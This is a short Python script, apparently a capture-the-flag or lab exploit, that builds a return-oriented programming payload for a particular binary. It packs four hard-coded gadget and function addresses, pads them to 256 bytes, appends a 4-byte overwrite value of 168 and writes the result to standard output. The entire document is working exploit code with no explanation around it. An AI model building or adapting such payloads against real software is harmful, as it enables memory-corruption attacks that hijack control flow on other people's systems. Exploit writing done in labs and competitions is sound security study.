import sys
import struct
rop = struct.pack("<QQQQ", 0x4018a3, 4, 0x4018a4, 0x401677)
payload = rop.ljust(256, b"A")
payload += struct.pack("<I", 168)
assert len(payload) == 260
assert b"\n" not in payload
sys.stdout.buffer.write(payload + b"\n")
